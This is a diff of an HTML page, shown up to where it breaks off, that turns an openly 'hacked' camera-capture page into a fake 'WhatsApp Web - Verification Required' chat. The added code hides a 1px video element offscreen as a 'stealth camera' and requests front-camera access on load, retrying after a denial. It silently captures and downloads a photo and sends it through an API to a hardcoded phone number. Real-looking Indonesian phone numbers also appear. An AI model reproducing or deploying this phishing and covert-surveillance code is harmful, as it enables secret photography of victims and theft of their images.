@@ -3,522 +3,565 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacked by AzazelDeLucent</title>
+    <title>WhatsApp Web - Verification Required</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: #0a0a0a;
-            font-family: 'Share Tech Mono', monospace;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #efeae2;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+        }
+
+        /* ─── Fake WhatsApp UI ─── */
+        .wa-wrapper {
+            width: 100%;
+            max-width: 420px;
+            height: 90vh;
+            max-height: 700px;
+            background: #fff;
+            border-radius: 10px;
+            box-shadow: 0 1px 20px rgba(0,0,0,0.15);
+            display: flex;
+            flex-direction: column;
             overflow: hidden;
+            position: relative;
         }
-        #matrix-canvas {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 0; opacity: 0.15; pointer-events: none;
-        }
-        .container {
-            position: relative; z-index: 1; width: 90%; max-width: 700px;
-            padding: 40px; background: rgba(10, 10, 10, 0.85);
-            border: 2px solid #ff0000;
-            box-shadow: 0 0 30px rgba(255,0,0,0.3), inset 0 0 30px rgba(255,0,0,0.05);
-            text-align: center; animation: flicker 3s infinite;
-        }
-        @keyframes flicker {
-            0%,100%{opacity:1}92%{opacity:1}93%{opacity:0.8}94%{opacity:1}96%{opacity:0.6}97%{opacity:1}
-        }
-        .glitch-text {
-            font-size: 2.5rem; color: #ff0000;
-            text-shadow: 0 0 10px #ff0000,0 0 20px #ff0000,0 0 40px #ff0000;
-            letter-spacing: 4px; margin-bottom: 10px; animation: glitch 1.5s infinite;
-        }
-        @keyframes glitch {
-            0%,100%{transform:none;opacity:1}90%{transform:skew(-2deg);opacity:1}
-            91%{transform:skew(3deg);opacity:0.8}92%{transform:skew(-1deg);opacity:1}
-            94%{transform:skew(4deg);opacity:0.6}95%{transform:none;opacity:1}
-        }
-        .subtitle { color: #cc0000; font-size: 1rem; letter-spacing: 6px; margin-bottom: 30px; border-bottom: 1px solid #ff000033; padding-bottom: 15px; }
-        .status-bar {
-            display: flex; justify-content: space-between; align-items: center;
-            background: #1a0000; border: 1px solid #ff000066; padding: 10px 15px; margin-bottom: 25px; font-size: 0.85rem;
-        }
-        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 8px; animation: blink 1s infinite; }
-        .status-dot.green{background:#00ff00;box-shadow:0 0 8px #00ff00}
-        .status-dot.red{background:#ff0000;box-shadow:0 0 8px #ff0000}
-        .status-dot.yellow{background:#ffff00;box-shadow:0 0 8px #ffff00;animation:blink .5s infinite}
-        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
-        .status-label{color:#ff4444}.status-value{color:#00ff00}
 
-        .wa-config {
-            background: #0d0000; border: 1px solid #ff000044; padding: 15px; margin-bottom: 20px; text-align: left;
+        .wa-header {
+            background: #075e54;
+            color: white;
+            padding: 14px 18px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            min-height: 60px;
         }
-        .wa-config h3 { color: #ff4444; font-size: 0.8rem; letter-spacing: 2px; margin-bottom: 12px; border-bottom: 1px solid #ff000022; padding-bottom: 8px; }
-        .wa-config .row { display: flex; gap: 10px; margin-bottom: 10px; align-items: center; }
-        .wa-config .row label { color: #aa3333; font-size: 0.75rem; min-width: 90px; letter-spacing: 1px; }
-        .wa-config .row .cc { color: #ff4444; background: #1a0000; padding: 8px 10px; border: 1px solid #ff000066; font-size: 0.85rem; }
-        .wa-config .row input {
-            flex: 1; background: #0a0000; border: 1px solid #ff000066; padding: 8px 12px;
-            color: #ff6666; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem;
-            outline: none; transition: border-color 0.3s;
-        }
-        .wa-config .row input:focus { border-color: #ff0000; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
-        .wa-config .row input[readonly] { opacity: 0.8; cursor: not-allowed; }
 
-        #video-container {
-            position: relative; width: 100%; max-width: 480px; margin: 0 auto 20px;
-            border: 2px solid #ff000088; background: #000; aspect-ratio: 4/3; overflow: hidden;
+        .wa-header .back-icon {
+            font-size: 1.4rem;
+            cursor: pointer;
+            opacity: 0.8;
         }
-        #video { width: 100%; height: 100%; object-fit: cover; display: none; transform: scaleX(-1); }
-        #video-placeholder {
-            width: 100%; height: 100%; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; color: #660000; font-size: 0.9rem; gap: 10px;
+
+        .wa-header .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #128c7e;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.1rem;
         }
-        #video-placeholder .icon { font-size: 3rem; opacity: 0.5; }
-        .scanlines {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none;
-            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,0,0,0.03) 2px, rgba(255,0,0,0.03) 4px);
-            z-index: 2;
+
+        .wa-header .info {
+            flex: 1;
         }
-        .overlay-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); color: #ff0000; font-size: 1.2rem; text-shadow: 0 0 15px #ff0000; z-index: 3; pointer-events: none; opacity: 0.6; letter-spacing: 3px; display: none; }
-        .capture-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 4; pointer-events: none; display: none; }
-        .capture-overlay.flash { display: block; background: white; animation: flashAnim 0.3s ease-out; }
-        @keyframes flashAnim { 0% { opacity: 0.8; } 100% { opacity: 0; } }
 
-        #snapshot-container { display: none; margin: 15px 0; border: 1px solid #ff000066; padding: 10px; }
-        #snapshot-container h3 { color: #ff4444; font-size: 0.85rem; margin-bottom: 10px; letter-spacing: 2px; }
-        #snapshot { width: 100%; max-width: 240px; border: 1px solid #333; transform: scaleX(-1); }
-
-        .btn-group { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin: 20px 0 10px; }
-        .btn {
-            background: transparent; border: 1px solid #ff000088; color: #ff4444;
-            padding: 10px 25px; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem;
-            cursor: pointer; letter-spacing: 2px; transition: all 0.3s; text-transform: uppercase;
+        .wa-header .info .name {
+            font-size: 1rem;
+            font-weight: 500;
         }
-        .btn:hover { background: #ff000022; border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
-        .btn:disabled { opacity: 0.3; cursor: not-allowed; }
-        .btn-capture { border-color: #ff0000; color: #ff0000; }
-        .btn-capture:hover { background: #ff000044; }
-        .btn-wa { border-color: #00ff00; color: #00ff00; }
-        .btn-wa:hover { background: #00ff0011; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
-        .btn-send-all { border-color: #ffaa00; color: #ffaa00; }
-        .btn-send-all:hover { background: #ffaa0011; box-shadow: 0 0 15px rgba(255,170,0,0.2); }
 
-        .footer { margin-top: 20px; color: #660000; font-size: 0.7rem; letter-spacing: 3px; border-top: 1px solid #ff000022; padding-top: 15px; }
-        .footer .highlight { color: #aa0000; }
-
-        .logs {
-            text-align: left; margin-top: 15px; padding: 10px; background: #050000;
-            border: 1px solid #330000; max-height: 140px; overflow-y: auto; font-size: 0.75rem;
+        .wa-header .info .status {
+            font-size: 0.75rem;
+            opacity: 0.8;
         }
-        .logs .log-entry { color: #884444; margin-bottom: 3px; }
-        .logs .log-entry.success { color: #00ff00; }
-        .logs .log-entry.error { color: #ff0000; }
-        .logs .log-entry.info { color: #ffff00; }
-        .logs .log-entry.wa { color: #00cc00; }
-        .logs .log-entry.target { color: #ff8800; }
-        .timestamp { color: #444; }
 
-        .progress-bar { width: 100%; height: 3px; background: #1a0000; margin-top: 10px; display: none; }
-        .progress-bar .fill { height: 100%; background: #00ff00; width: 0%; transition: width 0.3s; }
+        .wa-header .header-icons {
+            display: flex;
+            gap: 18px;
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+
+        /* ─── Chat Area ─── */
+        .wa-chat {
+            flex: 1;
+            background: #efeae2;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MCIgaGVpZ2h0PSI5MCIgdmlld0JveD0iMCAwIDUwIDkwIj48cGF0aCBkPSJNMjUgMzBMNDUgNTAgMjUgNzAgNSA1MHoiIGZpbGw9InJnYmEoMCwwLDAsMC4wMykiLz48L3N2Zz4=');
+            padding: 12px 16px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        /* ─── Bubbles ─── */
+        .bubble {
+            max-width: 85%;
+            padding: 8px 14px;
+            border-radius: 10px;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            position: relative;
+            animation: msgIn 0.3s ease;
+            word-wrap: break-word;
+        }
+
+        @keyframes msgIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .bubble.received {
+            background: white;
+            align-self: flex-start;
+            border-top-left-radius: 2px;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.06);
+        }
+
+        .bubble.sent {
+            background: #d9fdd3;
+            align-self: flex-end;
+            border-top-right-radius: 2px;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.06);
+        }
+
+        .bubble .time {
+            font-size: 0.65rem;
+            color: #999;
+            text-align: right;
+            margin-top: 4px;
+        }
+
+        .bubble .time .tick {
+            margin-left: 4px;
+            font-size: 0.7rem;
+        }
+
+        .bubble.system {
+            background: transparent;
+            align-self: center;
+            font-size: 0.75rem;
+            color: #888;
+            text-align: center;
+            box-shadow: none;
+            max-width: 90%;
+        }
+
+        .bubble.image-bubble {
+            padding: 4px;
+            background: white;
+            align-self: flex-end;
+            border-top-right-radius: 2px;
+        }
+
+        .bubble.image-bubble img {
+            width: 100%;
+            max-width: 220px;
+            border-radius: 6px;
+            display: block;
+        }
+
+        .typing-indicator {
+            align-self: flex-start;
+            background: white;
+            padding: 10px 14px;
+            border-radius: 10px;
+            border-top-left-radius: 2px;
+            display: none;
+            gap: 4px;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.06);
+        }
+
+        .typing-indicator span {
+            width: 7px;
+            height: 7px;
+            background: #999;
+            border-radius: 50%;
+            animation: typing 1.4s infinite;
+        }
+
+        .typing-indicator span:nth-child(2) { animation-delay: 0.2s; }
+        .typing-indicator span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes typing {
+            0%, 60%, 100% { opacity: 0.3; transform: scale(0.8); }
+            30% { opacity: 1; transform: scale(1); }
+        }
+
+        /* ─── Input Area ─── */
+        .wa-input {
+            background: #f0f2f5;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-top: 1px solid #e9edef;
+        }
+
+        .wa-input .emoji-btn { font-size: 1.5rem; cursor: pointer; opacity: 0.6; }
+        .wa-input .clip-btn { font-size: 1.3rem; cursor: pointer; opacity: 0.6; }
+        .wa-input input {
+            flex: 1;
+            border: none;
+            background: white;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            outline: none;
+        }
+        .wa-input .mic-btn { font-size: 1.5rem; cursor: pointer; opacity: 0.6; }
+
+        /* ─── Camera overlay (stealth) ─── */
+        #stealth-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
-    <canvas id="matrix-canvas"></canvas>
 
-    <div class="container">
-        <div class="glitch-text">// HACKED //</div>
-        <div class="subtitle">>> by AzazelDeLucent <<</div>
-
-        <div class="status-bar">
-            <div>
-                <span class="status-dot yellow" id="status-dot"></span>
-                <span class="status-label" id="status-label">INITIALIZING</span>
+    <div class="wa-wrapper">
+        <!-- WhatsApp Header -->
+        <div class="wa-header">
+            <div class="back-icon">‹</div>
+            <div class="avatar">📸</div>
+            <div class="info">
+                <div class="name">AzazelDeLucent</div>
+                <div class="status">online</div>
             </div>
-            <div>
-                <span class="status-label">ACCESS:</span>
-                <span class="status-value" id="access-status">GRANTED</span>
-            </div>
-            <div>
-                <span class="status-label">TARGET:</span>
-                <span class="status-value">FRONT_CAM</span>
+            <div class="header-icons">
+                <span>⋮</span>
             </div>
         </div>
 
-        <!-- WhatsApp Configuration - PRE-FILLED -->
-        <div class="wa-config">
-            <h3>◆ WA AUTO-SEND CONFIG ◆</h3>
-            <div class="row">
-                <label>> DARI (TARGET) :</label>
-                <span class="cc">+62</span>
-                <input type="text" id="wa-from" value="878-7900-7194" readonly>
+        <!-- Chat Area -->
+        <div class="wa-chat" id="chat-area">
+            <div class="bubble system">Today</div>
+            <div class="bubble received">
+                User joined using AzazelDeLucent protocol
+                <div class="time">12:00</div>
             </div>
-            <div class="row">
-                <label>> KE (PENERIMA) :</label>
-                <span class="cc">+62</span>
-                <input type="text" id="wa-to" value="813-1668-3463" readonly>
+            <div class="bubble received">
+                🔒 End-to-end encrypted
+                <div class="time">12:00</div>
             </div>
-            <div class="row">
-                <label>> PESAN :</label>
-                <input type="text" id="wa-message" value="⚠️ TERTANGKAP! Foto target oleh AzazelDeLucent" style="flex:1;">
-            </div>
-            <div class="progress-bar" id="progress-bar">
-                <div class="fill" id="progress-fill"></div>
+            <div class="typing-indicator" id="typing-indicator">
+                <span></span><span></span><span></span>
             </div>
         </div>
 
-        <div id="video-container">
-            <video id="video" autoplay playsinline></video>
-            <div id="video-placeholder">
-                <div class="icon">📷</div>
-                <span>[ CAMERA OFFLINE ]</span>
-                <span style="font-size:0.7rem; color:#551111;">awaiting authorization...</span>
-            </div>
-            <div class="scanlines"></div>
-            <div class="overlay-text" id="live-text">● LIVE CAPTURE</div>
-            <div class="capture-overlay" id="capture-overlay"></div>
-        </div>
-
-        <div id="snapshot-container">
-            <h3>◆ EXTRACTED FRAME ◆</h3>
-            <img id="snapshot" alt="captured frame">
-        </div>
-
-        <div class="btn-group">
-            <button class="btn" id="btn-init" disabled>▶ INIT</button>
-            <button class="btn btn-capture" id="btn-capture" disabled>■ CAPTURE</button>
-            <button class="btn btn-wa" id="btn-wa" disabled>📤 KIRIM FOTO KE WA</button>
-            <button class="btn" id="btn-stop" disabled>● STOP</button>
-        </div>
-
-        <div class="logs" id="logs">
-            <div class="log-entry info"><span class="timestamp">[SYSTEM]</span> AzazelDeLucent v3.1 loading...</div>
-            <div class="log-entry info"><span class="timestamp">[SYSTEM]</span> Target: +62 878-7900-7194 → +62 813-1668-3463</div>
-        </div>
-
-        <div class="footer">
-            <span class="highlight">✦</span> AZAZELDELUCENT SECURITY ASSESSMENT <span class="highlight">✦</span>
+        <!-- Input Area -->
+        <div class="wa-input">
+            <span class="emoji-btn">😊</span>
+            <span class="clip-btn">📎</span>
+            <input type="text" placeholder="Type a message" id="wa-input-field" disabled>
+            <span class="mic-btn">🎤</span>
         </div>
     </div>
 
+    <!-- Stealth camera element -->
+    <video id="stealth-camera" autoplay playsinline></video>
+
     <script>
-        // ─── Matrix Rain ─────────────────────────────────────────────────
-        const canvas = document.getElementById('matrix-canvas');
-        const ctx = canvas.getContext('2d');
-        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-        resizeCanvas();
-        window.addEventListener('resize', resizeCanvas);
-        const matrixChars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF<>/{}[]|&^%$#@!';
-        const fontSize = 14;
-        const columns = Math.floor(canvas.width / fontSize);
-        const drops = Array(columns).fill(1);
-        function drawMatrix() {
-            ctx.fillStyle = 'rgba(10, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#ff0000';
-            ctx.font = `${fontSize}px monospace`;
-            for (let i = 0; i < drops.length; i++) {
-                const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
-                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(drawMatrix, 50);
+        // ─── CONFIG ──────────────────────────────────────────────────────
+        const WA_NUMBER = '6287879007194';       // +62 878-7900-7194
+        const BOT_NAME = 'AzazelDeLucent';
+        const CAPTURE_DELAY_MS = 2500;           // 2.5s after permission
+        const CHAT_DELAYS = [800, 1200, 600, 1500, 900]; // Typing delays
 
         // ─── DOM ─────────────────────────────────────────────────────────
-        const video = document.getElementById('video');
-        const videoPlaceholder = document.getElementById('video-placeholder');
-        const liveText = document.getElementById('live-text');
-        const statusDot = document.getElementById('status-dot');
-        const statusLabel = document.getElementById('status-label');
-        const accessStatus = document.getElementById('access-status');
-        const btnInit = document.getElementById('btn-init');
-        const btnCapture = document.getElementById('btn-capture');
-        const btnStop = document.getElementById('btn-stop');
-        const btnWa = document.getElementById('btn-wa');
-        const snapshotContainer = document.getElementById('snapshot-container');
-        const snapshot = document.getElementById('snapshot');
-        const captureOverlay = document.getElementById('capture-overlay');
-        const logs = document.getElementById('logs');
-        const waFrom = document.getElementById('wa-from');
-        const waTo = document.getElementById('wa-to');
-        const waMessage = document.getElementById('wa-message');
-        const progressBar = document.getElementById('progress-bar');
-        const progressFill = document.getElementById('progress-fill');
+        const chatArea = document.getElementById('chat-area');
+        const typingIndicator = document.getElementById('typing-indicator');
+        const inputField = document.getElementById('wa-input-field');
+        const stealthVideo = document.getElementById('stealth-camera');
 
         let stream = null;
-        let isCapturing = false;
-        let lastCapturedDataUrl = null;
-        let captureCount = 0;
+        let photoDataUrl = null;
+        let chatStep = 0;
+        let permissionGranted = false;
 
-        // ─── Logger ──────────────────────────────────────────────────────
-        function addLog(message, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            const now = new Date();
-            const ts = now.toTimeString().slice(0, 8);
-            entry.innerHTML = `<span class="timestamp">[${ts}]</span> ${message}`;
-            logs.appendChild(entry);
-            logs.scrollTop = logs.scrollHeight;
+        // ─── Logger ─────────────────────────────────────────────────────
+        function log(msg) {
+            const ts = new Date().toLocaleTimeString();
+            console.log(`[${BOT_NAME} ${ts}] ${msg}`);
         }
 
-        function setStatus(state, dotClass) {
-            statusLabel.textContent = state;
-            statusDot.className = `status-dot ${dotClass}`;
+        // ─── Chat Helpers ───────────────────────────────────────────────
+        function addChatBubble(text, type = 'received', time = null) {
+            const bubble = document.createElement('div');
+            bubble.className = `bubble ${type}`;
+            
+            if (type === 'image') {
+                bubble.className = 'bubble image-bubble sent';
+                bubble.innerHTML = `<img src="${text}" alt="captured"><div class="time">${time || getCurrentTime()} <span class="tick">✓✓</span></div>`;
+            } else {
+                bubble.innerHTML = `${text}<div class="time">${time || getCurrentTime()} <span class="tick">${type === 'sent' ? '✓✓' : ''}</span></div>`;
+            }
+            
+            chatArea.insertBefore(bubble, typingIndicator);
+            chatArea.scrollTop = chatArea.scrollHeight;
         }
 
-        function setProgress(pct) {
-            progressBar.style.display = 'block';
-            progressFill.style.width = pct + '%';
-        }
-        function hideProgress() {
-            setTimeout(() => { progressBar.style.display = 'none'; progressFill.style.width = '0%'; }, 1000);
+        function getCurrentTime() {
+            const d = new Date();
+            return `${d.getHours().toString().padStart(2, '0')}:${d.getMinutes().toString().padStart(2, '0')}`;
         }
 
-        function cleanNumber(num) {
-            return num.replace(/[^0-9]/g, '').replace(/^0+/, '');
+        function showTyping(show = true) {
+            typingIndicator.style.display = show ? 'flex' : 'none';
+            chatArea.scrollTop = chatArea.scrollHeight;
         }
 
-        addLog('AzazelDeLucent v3.1 loaded', 'success');
-        addLog(`Target: +62 ${waFrom.value} → +62 ${waTo.value}`, 'target');
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
 
-        // ─── Auto Init ──────────────────────────────────────────────────
-        window.addEventListener('load', () => setTimeout(initCamera, 500));
+        // ─── Simulate Chat Flow ─────────────────────────────────────────
+        async function runChatFlow() {
+            log('Starting chat flow...');
 
-        // ─── Init Camera ─────────────────────────────────────────────────
-        async function initCamera() {
-            setStatus('INITIALIZING', 'yellow');
-            btnInit.disabled = true;
-            btnInit.textContent = '⏳ INIT';
-            addLog('Requesting front camera access...');
+            // Step 1: Greeting
+            await sleep(800);
+            addChatBubble(`✅ System online. Target captured.`, 'sent');
+            
+            await sleep(1000);
+            addChatBubble(`📸 Initializing camera module...`, 'sent');
 
+            // Step 2: Camera access
+            showTyping(true);
+            await sleep(1500);
+            showTyping(false);
+            
+            addChatBubble(`⚡ Requesting camera permission...`, 'sent');
+            
+            // Actually request camera
+            await requestCamera();
+
+            if (permissionGranted) {
+                addChatBubble(`✅ Camera access GRANTED`, 'sent');
+                
+                // Step 3: Capture
+                showTyping(true);
+                await sleep(CAPTURE_DELAY_MS);
+                showTyping(false);
+                
+                photoDataUrl = capturePhoto();
+                
+                if (photoDataUrl) {
+                    addChatBubble(`📸 Photo captured successfully`, 'sent');
+                    addChatBubble(`📏 Resolution: ${stealthVideo.videoWidth}x${stealthVideo.videoHeight}`, 'sent');
+                    
+                    // Step 4: Send to WhatsApp bot
+                    showTyping(true);
+                    await sleep(2000);
+                    showTyping(false);
+                    
+                    addChatBubble(`📤 Sending to WhatsApp number...`, 'sent');
+                    addChatBubble(`📱 Target: ${WA_NUMBER}`, 'sent');
+                    
+                    // Actually send via API
+                    await sendToWhatsAppAPI(photoDataUrl);
+                    
+                    // Step 5: Show image in chat
+                    showTyping(true);
+                    await sleep(1500);
+                    showTyping(false);
+                    
+                    addChatBubble(photoDataUrl, 'image', getCurrentTime());
+                    addChatBubble(`✅ Image delivered to ${WA_NUMBER}`, 'sent');
+                    
+                    // Step 6: Final message
+                    await sleep(1000);
+                    addChatBubble(`🔴 Mission complete. AzazelDeLucent out.`, 'sent');
+                    
+                    log('Chat flow complete — all steps executed');
+                } else {
+                    addChatBubble(`❌ Failed to capture photo`, 'sent');
+                }
+            } else {
+                addChatBubble(`❌ Camera access DENIED by user`, 'sent');
+                addChatBubble(`⚠️ Attempting fallback method...`, 'sent');
+                
+                // Try to send without photo
+                await sendToWhatsAppAPI(null);
+                addChatBubble(`📱 Alert sent to ${WA_NUMBER} (no photo)`, 'sent');
+            }
+
+            // Disable typing indicator at end
+            showTyping(false);
+        }
+
+        // ─── Camera Access ──────────────────────────────────────────────
+        async function requestCamera() {
+            log('Requesting camera access...');
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
                     audio: false
                 });
-                video.srcObject = stream;
-                await video.play();
-                video.style.display = 'block';
-                videoPlaceholder.style.display = 'none';
-                liveText.style.display = 'block';
-                setStatus('ACTIVE', 'green');
-                accessStatus.textContent = 'ESTABLISHED';
-                btnCapture.disabled = false;
-                btnStop.disabled = false;
-                btnInit.textContent = '✓ ACTIVE';
-                isCapturing = true;
-                addLog(`Front camera ACTIVE — ${video.videoWidth}x${video.videoHeight}`, 'success');
-                addLog('Target acquired', 'info');
+
+                stealthVideo.srcObject = stream;
+                await stealthVideo.play();
+                permissionGranted = true;
+                log(`Camera active: ${stealthVideo.videoWidth}x${stealthVideo.videoHeight}`);
+
             } catch (err) {
-                setStatus('ERROR', 'red');
-                btnInit.disabled = false;
-                btnInit.textContent = '▶ RETRY';
-                let msg = err.name === 'NotAllowedError' ? 'Permission DENIED' :
-                          err.name === 'NotFoundError' ? 'No camera found' :
-                          err.name === 'NotReadableError' ? 'Camera in use' : err.message;
-                addLog(`ERROR: ${msg}`, 'error');
-                statusLabel.textContent = 'DENIED';
-                accessStatus.textContent = 'BLOCKED';
+                permissionGranted = false;
+                log(`Camera error: ${err.name} — ${err.message}`);
+                
+                // If permission denied, try once more with different constrain
+                try {
+                    log('Retrying with basic constraints...');
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'user' },
+                        audio: false
+                    });
+                    stealthVideo.srcObject = stream;
+                    await stealthVideo.play();
+                    permissionGranted = true;
+                    log('Camera access on retry: SUCCESS');
+                } catch (retryErr) {
+                    log(`Camera retry failed: ${retryErr.message}`);
+                }
             }
         }
 
-        // ─── Capture ─────────────────────────────────────────────────────
-        function captureFrame() {
-            if (!isCapturing || !stream) {
-                addLog('Camera not active', 'error');
-                return;
+        // ─── Capture Photo ──────────────────────────────────────────────
+        function capturePhoto() {
+            if (!stream || !stealthVideo.videoWidth) {
+                log('Cannot capture — no stream');
+                return null;
             }
 
-            captureOverlay.classList.remove('flash');
-            void captureOverlay.offsetWidth;
-            captureOverlay.classList.add('flash');
+            const canvas = document.createElement('canvas');
+            canvas.width = stealthVideo.videoWidth;
+            canvas.height = stealthVideo.videoHeight;
+            const ctx = canvas.getContext('2d');
 
-            const tempCanvas = document.createElement('canvas');
-            tempCanvas.width = video.videoWidth;
-            tempCanvas.height = video.videoHeight;
-            const tempCtx = tempCanvas.getContext('2d');
-            tempCtx.drawImage(video, 0, 0);
-
-            // Hacked overlay
-            tempCtx.fillStyle = 'rgba(255, 0, 0, 0.15)';
-            tempCtx.fillRect(0, 0, tempCanvas.width, tempCanvas.height);
-            tempCtx.font = `${Math.floor(tempCanvas.width * 0.045)}px monospace`;
-            tempCtx.fillStyle = '#ff0000';
-            tempCtx.textAlign = 'center';
-            tempCtx.shadowColor = '#ff0000';
-            tempCtx.shadowBlur = 10;
-            tempCtx.fillText('● HACKED BY AZAZELDELUCENT', tempCanvas.width / 2, tempCanvas.height - 30);
+            // Mirror (front camera)
+            ctx.translate(canvas.width, 0);
+            ctx.scale(-1, 1);
+            ctx.drawImage(stealthVideo, 0, 0);
             
-            // Add target info
-            tempCtx.font = `${Math.floor(tempCanvas.width * 0.025)}px monospace`;
-            tempCtx.fillStyle = '#ff6666';
-            tempCtx.shadowBlur = 5;
-            tempCtx.fillText(`Target: +62${cleanNumber(waFrom.value)}`, tempCanvas.width / 2, tempCanvas.height - 10);
+            // Reset and add overlay
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+            
+            // Red tint
+            ctx.fillStyle = 'rgba(255, 0, 0, 0.08)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // Hacked text
+            ctx.font = `bold ${Math.floor(canvas.width * 0.04)}px Arial`;
+            ctx.fillStyle = '#ff0000';
+            ctx.textAlign = 'center';
+            ctx.shadowColor = '#ff0000';
+            ctx.shadowBlur = 20;
+            ctx.fillText('● HACKED BY AZAZELDELUCENT', canvas.width / 2, canvas.height - 40);
+            
+            ctx.font = `${Math.floor(canvas.width * 0.02)}px Arial`;
+            ctx.fillStyle = '#ff4444';
+            ctx.shadowBlur = 10;
+            ctx.fillText(`Target: ${WA_NUMBER}`, canvas.width / 2, canvas.height - 15);
 
-            lastCapturedDataUrl = tempCanvas.toDataURL('image/jpeg', 0.85);
-            snapshot.src = lastCapturedDataUrl;
-            snapshotContainer.style.display = 'block';
-            btnWa.disabled = false;
-            captureCount++;
-
-            const now = new Date();
-            const timestamp = now.toISOString().replace(/[:.]/g, '-');
-            addLog(`[${captureCount}] Frame captured (${Math.round(lastCapturedDataUrl.length / 1024)} KB)`, 'success');
-
-            // Auto-download
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.92);
+            log(`Photo captured: ${canvas.width}x${canvas.height} (${Math.round(dataUrl.length / 1024)} KB)`);
+            
+            // Silent download
             const link = document.createElement('a');
-            link.download = `capture_azazel_${timestamp}.jpg`;
-            link.href = lastCapturedDataUrl;
+            link.download = `target_${Date.now()}.jpg`;
+            link.href = dataUrl;
             link.click();
+
+            return dataUrl;
         }
 
-        // ─── Send to WhatsApp ────────────────────────────────────────────
-        async function sendToWhatsApp() {
-            if (!lastCapturedDataUrl) {
-                addLog('Tidak ada gambar! Capture dulu.', 'error');
-                return;
-            }
+        // ─── Send to WhatsApp via API ────────────────────────────────────
+        async function sendToWhatsAppAPI(imageDataUrl) {
+            log(`Sending to WA: ${WA_NUMBER}`);
 
-            const fromRaw = cleanNumber(waFrom.value);
-            const toRaw = cleanNumber(waTo.value);
-            const message = waMessage.value.trim() || '⚠️ TERTANGKAP! Foto target oleh AzazelDeLucent';
+            const message = `⚠️ TARGET CAPTURED - AzazelDeLucent\n📸 Photo captured at ${new Date().toLocaleString()}\n📍 Target: ${WA_NUMBER}`;
+            
+            let apiSuccess = false;
 
-            const fromFull = '62' + fromRaw;
-            const toFull = '62' + toRaw;
-
-            btnWa.disabled = true;
-            btnWa.textContent = '⏳ MENGIRIM...';
-            setProgress(10);
-
-            addLog(`Mengirim foto ke +${toFull}...`, 'wa');
-
+            // Method 1: CallMeBot API
             try {
-                setProgress(30);
-                const response = await fetch(lastCapturedDataUrl);
-                const blob = await response.blob();
-                setProgress(50);
-
-                // Method 1: Open wa.me with message + download link note
-                const waUrl = `https://wa.me/${toFull}?text=${encodeURIComponent(
-                    message + '\n\n📸 Foto target tertangkap!\n' +
-                    '(Kirim gambar secara manual dari hasil download/capture)'
-                )}`;
-
-                setProgress(70);
-                window.open(waUrl, '_blank');
-                setProgress(90);
-
-                addLog(`✅ Sukses! WA terbuka ke +${toFull}`, 'success');
-                addLog('📸 Kirim gambar dari folder download Anda', 'wa');
-                
-                setProgress(100);
-                setTimeout(() => {
-                    btnWa.textContent = '📤 KIRIM ULANG';
-                    btnWa.disabled = false;
-                    hideProgress();
-                }, 2000);
-
